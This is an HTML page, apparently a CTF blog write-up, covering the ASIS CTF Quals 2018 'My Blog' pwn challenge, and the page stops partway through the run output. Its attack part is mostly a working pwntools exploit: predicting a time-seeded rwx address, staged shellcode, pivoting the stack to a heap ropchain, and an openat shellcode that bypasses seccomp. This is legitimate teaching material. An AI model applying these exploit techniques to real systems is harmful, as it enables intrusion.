@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>ASIS CTF Quals 2018 - My Blog | kileak</title>
+
+
+
+
+
+<meta name="description" content="ASIS CTF Quals 2018 - My Blog">
+
+
+<meta name="keywords" content="asis">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2018/asisquals18-blog/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">ASIS CTF Quals 2018 - My Blog</h1>
+      <p class="post-meta">Apr 29, 2018</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>ASIS CTF Quals 2018 - My Blog
+<!--break--></p>
+
+  <p>Hey! 
+I created a new blog system, and I think my blog is very secure!!!
+Come on, friend!</p>
+
+  <p>nc 159.65.125.233 31337</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/myblog/myblog">myblog</a> <a href="https://kileak.github.io/assets/myblog/xpl.py">xpl.py</a></p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">███╗   ███╗██╗   ██╗    ██████╗ ██╗      ██████╗  ██████╗ 
+████╗ ████║╚██╗ ██╔╝    ██╔══██╗██║     ██╔═══██╗██╔════╝ 
+██╔████╔██║ ╚████╔╝     ██████╔╝██║     ██║   ██║██║  ███╗
+██║╚██╔╝██║  ╚██╔╝      ██╔══██╗██║     ██║   ██║██║   ██║
+██║ ╚═╝ ██║   ██║       ██████╔╝███████╗╚██████╔╝╚██████╔╝
+╚═╝     ╚═╝   ╚═╝       ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ 
+                                                          
+1. Write a blog post
+2. Delete a blog post
+3. Show the blog owner
+4. Exit</code></pre></figure>
+
+<p>While this challenge might look like a heap challenge at first, it’s not…</p>
+
+<p>We can create and delete blog posts, which will be put on the heap, but that’s it for being heap related. The interesting part is hidden in <code class="language-plaintext highlighter-rouge">Show the blog owner</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">3
+Old Owner : my_blog
+New Owner : </code></pre></figure>
+
+<p>This let’s us write a new blog owner, but we’re only allowed to input 7 bytes for this. Let’s check some code to see, what’s behind the blog owner</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">init_app</span><span class="p">()</span>
+<span class="p">{</span>  
+  <span class="n">show_banner</span><span class="p">();</span>
+
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>  
+
+  <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>           
+  
+  <span class="n">mapped_region</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xFFFFF000</span><span class="p">),</span> <span class="mh">0x2000uLL</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+
+  <span class="n">BLOG_OWNER</span> <span class="o">=</span> <span class="n">mapped_region</span><span class="p">;</span>
+  <span class="o">*</span><span class="n">mapped_region</span> <span class="o">=</span> <span class="err">'</span><span class="n">golb_ym</span><span class="err">'</span><span class="p">;</span>
+  
+  <span class="n">init_seccomp</span><span class="p">();</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This will set up a <code class="language-plaintext highlighter-rouge">rwx</code> section at a “random” address, but since the random generator is seeded with the current time, we can easily guess the address for this section.</p>
+
+<p>This region will be used to store the blog owner (which is also the one, we can change in <code class="language-plaintext highlighter-rouge">Show the blog owner</code>)</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">show_blog</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Old Owner : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">BLOG_OWNER</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"New Owner : "</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">BLOG_OWNER</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
+  <span class="n">BLOG_OWNER</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+  
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Done!!"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>So we can write 7 bytes to a <code class="language-plaintext highlighter-rouge">rwx</code> section. This already yells to put a shellcode there. But then again 7 bytes aren’t quite much for doing something useful there.</p>
+
+<p>Checking the main function, we can also see, that there’s a hidden menu, when entering <code class="language-plaintext highlighter-rouge">31337</code>, which calls a function, which will for one leak its own address and lets us overwrite the return address with a value smaller then itself. We can use this to return to the <code class="language-plaintext highlighter-rouge">rwx</code> section, where we prepared a shellcode, which then will get executed.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">leet_leak</span><span class="p">()</span>
+<span class="p">{</span>  
+  <span class="n">puts</span><span class="p">(</span><span class="s">"============================================="</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"I will give you a gift %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">leet_leak</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">);</span>
+ 
+  <span class="c1">// various checks</span>
+  <span class="p">...</span>
+  
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Done!!"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Adding blog entries, will create a chunk on the heap and store the address for the blog entry directly behind the <code class="language-plaintext highlighter-rouge">blog owner</code> in the <code class="language-plaintext highlighter-rouge">rwx</code> section</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">write_blogentry</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Input content"</span><span class="p">);</span>
+  <span class="n">blogentry</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
+  <span class="n">blogentry</span><span class="o">-&gt;</span><span class="n">content</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">blogentry</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">);</span>
+  <span class="n">blogentry</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">[</span><span class="mi">47</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Input author"</span><span class="p">);</span>
+  <span class="n">blogentry</span><span class="o">-&gt;</span><span class="n">author</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8uLL</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">blogentry</span><span class="o">-&gt;</span><span class="n">author</span><span class="p">,</span> <span class="mi">7uLL</span><span class="p">);</span>
+  <span class="n">blogentry</span><span class="o">-&gt;</span><span class="n">author</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">BLOG_OWNER</span><span class="p">[</span><span class="n">BLOG_COUNTER</span><span class="o">++</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">blogentry</span><span class="p">;</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Done!!"</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>We can use the blog entries to prepare small ropchains on the heap, and then try to pivot the stack to the heap with our initial “mini” shellcode.</p>
+
+<ul>
+  <li>Read the pie leak (because leaks are always good :-))</li>
+  <li>Prepare stager shellcode in blog owner</li>
+  <li>Prepare ropchain on heap</li>
+  <li>Trigger stager shellcode</li>
+  <li>Let it roll</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">ctypes</span>
+
+<span class="n">ctypes</span><span class="p">.</span><span class="n">cdll</span><span class="p">.</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"libc.so.6"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">CDLL</span><span class="p">(</span><span class="s">"libc.so.6"</span><span class="p">)</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"159.65.125.233"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">31337</span>
+
+<span class="k">def</span> <span class="nf">write_blog</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">author</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">author</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> 
+
+<span class="k">def</span> <span class="nf">del_blog</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">show_blog</span><span class="p">(</span><span class="n">newauth</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Old Owner : "</span><span class="p">)</span>
+  <span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">newauth</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+  <span class="k">return</span> <span class="n">LEAK</span>
+
+<span class="k">def</span> <span class="nf">get_pie_leak</span><span class="p">(</span><span class="n">overwrite_ret</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">ret</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rbp</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"31337"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"gift "</span><span class="p">)</span>
+  <span class="n">LEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+  
+  <span class="k">if</span> <span class="ow">not</span> <span class="n">overwrite_ret</span><span class="p">:</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"0"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> 
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span>   
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+  <span class="k">return</span> <span class="n">LEAK</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Initialize srand"</span><span class="p">)</span>  
+
+  <span class="n">ADDR</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xFFFFF000</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"RWX section at        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ADDR</span><span class="p">))</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Exit</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+  <span class="n">PIE</span> <span class="o">=</span> <span class="n">get_pie_leak</span><span class="p">()</span>
+  <span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">PIE</span> <span class="o">-</span> <span class="mh">0xef4</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE leak              : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">PIE</span><span class="p">))</span>
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"PIE                   : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Initialize stager shellcode to pivot to heap ropchain"</span><span class="p">)</span>
+
+  <span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
+
+  <span class="n">SC</span> <span class="o">=</span> <span class="s">"""    
+    push [rbp]
+    pop rsp
+    pop rbp
+    leave
+    ret
+    """</span>
+
+  <span class="n">show_blog</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">SC</span><span class="p">))</span>
+
+  <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create ropchain to read bigger shellcode to rwx section"</span><span class="p">)</span>
+
+  <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ADDR</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xf20</span><span class="p">)</span>
+  <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+
+  <span class="n">write_blog</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">6</span><span class="p">)</span>
+  
+  <span class="n">get_pie_leak</span><span class="p">(</span><span class="bp">True</span><span class="p">,</span> <span class="n">ADDR</span><span class="p">,</span> <span class="n">ADDR</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
+
+  <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+  
+  <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+  <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./myblog"</span><span class="p">)</span>
+
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>   
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./myblog"</span><span class="p">)</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">srand</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+    <span class="k">print</span> <span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+    <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<p>Quite some stuff that happens there, so, let’s get into detail…</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">get_pie_leak(True, ADDR, ADDR+0x8)</code></li>
+</ul>
+
+<p>will set <code class="language-plaintext highlighter-rouge">rbp</code> to <code class="language-plaintext highlighter-rouge">ADDR+0x8</code> and set <code class="language-plaintext highlighter-rouge">rip</code> to <code class="language-plaintext highlighter-rouge">ADDR</code>. Since we created a blog entry, <code class="language-plaintext highlighter-rouge">ADDR+0x8</code> will point to a chunk on the heap</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10gx 0x52d26000
+0x52d26000: 0x00c3c95d5c0075ff  0x0000555555757670  shellcode / blog entry 0
+0x52d26010: 0x0000000000000000  0x0000000000000000
+0x52d26020: 0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<p>Our stager shellcode</p>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">push [rbp]
+pop rsp
+pop rbp
+leave
+ret</code></pre></figure>
+
+<p>will thus</p>
+
+<ul>
+  <li>push the address of the blog entry chunk onto the stack.</li>
+  <li><code class="language-plaintext highlighter-rouge">pop rsp</code> will pivot the stack to the blog entry. The first pointer of a blog entry is a pointer to its content. Thus we’ll now have the content pointer on top of the stack</li>
+  <li><code class="language-plaintext highlighter-rouge">pop rbp</code> will now move the content pointer to <code class="language-plaintext highlighter-rouge">rbp</code></li>
+  <li><code class="language-plaintext highlighter-rouge">leave; ret</code> will thus move rsp to <code class="language-plaintext highlighter-rouge">content+8</code></li>
+  <li>and this will execute the ropchain we prepared in our blog entry :)</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">payload = p64(ADDR+0x8)
+payload += p64(e.address + 0xf20)
+payload += p64(0xdeadbeef)</code></pre></figure>
+
+<p>will set <code class="language-plaintext highlighter-rouge">rbp</code> to <code class="language-plaintext highlighter-rouge">rwx</code> section + 8 and then jump to the <code class="language-plaintext highlighter-rouge">read</code> int the <code class="language-plaintext highlighter-rouge">leet_leak</code> function</p>
+
+<figure class="highlight"><pre><code class="language-asm" data-lang="asm">lea     rax, [rbp-8]
+mov     edx, 18h        ; nbytes
+mov     rsi, rax        ; buf
+mov     edi, 0          ; fd
+mov     eax, 0
+call    _read</code></pre></figure>
+
+<p>which will now read 24 bytes to the <code class="language-plaintext highlighter-rouge">rwx</code> section. So we can put another shellcode there.</p>
+
+<p>Though, we can only use the first 16 bytes for our shellcode, since we have to put another return address at the end, so our ropchain can continue.</p>
+
+<p>But 16 bytes are enough to do a second stager shellcode, which then lets us read the final shellcode.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send second stager shellcode to read unlimited shellcode"</span><span class="p">)</span>
+
+<span class="n">SC</span> <span class="o">=</span> <span class="s">"""
+    xor rax, rax
+    xor rdi, rdi
+    mov rsi, rsp    
+    xchg rdx, r11
+    syscall
+    jmp next    
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop   
+    next:
+"""</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">SC</span><span class="p">)[:</span><span class="mi">16</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ADDR</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">nop</code>s won’t be in our final shellcode and are only there to let pwntools calculate the <code class="language-plaintext highlighter-rouge">jmp next</code> correctly, because the return address will be stored in place of the <code class="language-plaintext highlighter-rouge">nop</code>s (<code class="language-plaintext highlighter-rouge">ADDR</code>).</p>
+
+<p>When the syscall gets executed <code class="language-plaintext highlighter-rouge">rsp</code> will point behind the just read data, and we’re writing the next shellcode to <code class="language-plaintext highlighter-rouge">rsp</code>.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0x7ffff7af90c4 --&gt; 0x477fffff0003d48 
+RDX: 0x246 
+RSI: 0x55ace018 --&gt; 0x0 
+RDI: 0x0 
+RBP: 0x8eb050fda874ce6 
+RSP: 0x55ace018 --&gt; 0x0 
+RIP: 0x55ace00c --&gt; 0x55ace00008eb050f 
+R8 : 0x7ffff7fe04c0 (0x00007ffff7fe04c0)
+R9 : 0x26 ('&amp;')
+R10: 0x78 ('x')
+R11: 0x7ffff7dd1880 --&gt; 0x0 
+R12: 0x555555554930 --&gt; 0x89485ed18949ed31 
+R13: 0x7fffffffe460 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x55ace003:  xor    rdi,rdi
+   0x55ace006:  mov    rsi,rsp
+   0x55ace009:  xchg   rdx,r11
+=&gt; 0x55ace00c:  syscall 
+   0x55ace00e:  jmp    0x55ace018
+   0x55ace010:  add    al,ah
+   0x55ace012:  lods   al,BYTE PTR ds:[rsi]
+   0x55ace013:  push   rbp
+No argument
+[------------------------------------stack-------------------------------------]
+0000| 0x55ace018 --&gt; 0x0 
+0008| 0x55ace020 --&gt; 0x0 
+0016| 0x55ace028 --&gt; 0x0 
+0024| 0x55ace030 --&gt; 0x0 
+0032| 0x55ace038 --&gt; 0x0 
+0040| 0x55ace040 --&gt; 0x0 
+0048| 0x55ace048 --&gt; 0x0 
+0056| 0x55ace050 --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0000000055ace00c in ?? ()</code></pre></figure>
+
+<p>So, this <code class="language-plaintext highlighter-rouge">read</code> will now read <code class="language-plaintext highlighter-rouge">0x246</code> bytes, to <code class="language-plaintext highlighter-rouge">0x55ace018</code> and our previous shellcode will then jump there. Should be more than enough to do some proper shellcode.</p>
+
+<p>But there are some blacklisting seccomp rules active</p>
+
+<ul>
+  <li>arch : amd64 (so no transfer to 32bit)</li>
+  <li>open (2)</li>
+  <li>execve (59)</li>
+  <li>fork (57)</li>
+  <li>vfork (58)</li>
+  <li>clone (56)</li>
+</ul>
+
+<p>No shell possible and we’re also not allowed to <code class="language-plaintext highlighter-rouge">open</code> the flag file to read it… But well, there’s still <code class="language-plaintext highlighter-rouge">openat</code> syscall to get around this :)</p>
+
+<p>From the other pwnables, we can guess, that the flag will be stored at <code class="language-plaintext highlighter-rouge">/home/pwn/flag</code>, so we just do an <code class="language-plaintext highlighter-rouge">openat/read/write</code> shellcode to get this thing done.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Send final shellcode to read/open/write flag"</span><span class="p">)</span>
+
+<span class="n">SC</span> <span class="o">=</span> <span class="s">"""
+    mov rax, 257
+    mov rdi, -100
+    mov rsi, %d
+    xor rdx, rdx
+    xor rcx, rcx
+    syscall
+
+    xchg rdi, rax
+    xor rax, rax
+    mov dl, 100
+    syscall
+
+    xor rax, rax
+    mov al, 1
+    mov rdi, 1
+    syscall
+
+"""</span> <span class="o">%</span> <span class="p">(</span><span class="n">ADDR</span><span class="o">+</span><span class="mh">0xe0</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">SC</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="p">(</span><span class="mi">200</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"/home/pwn/flag</span><span class="se">\x00</span><span class="s">"</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>Like already stated, the previous stager shellcode will read this to the destination, where our <code class="language-plaintext highlighter-rouge">jmp</code> is already pointing to, and executes it:</p>
+
+<ul>
+  <li>openat(-100, “/home/pwn/flag”, 0, 0)</li>
+  <li>read(fd, buffer, 100)</li>
+  <li>write(1, buffer, 100)</li>
+</ul>
+
+<p>resulting in another flag:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] '/home/kileak/blog/myblog'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
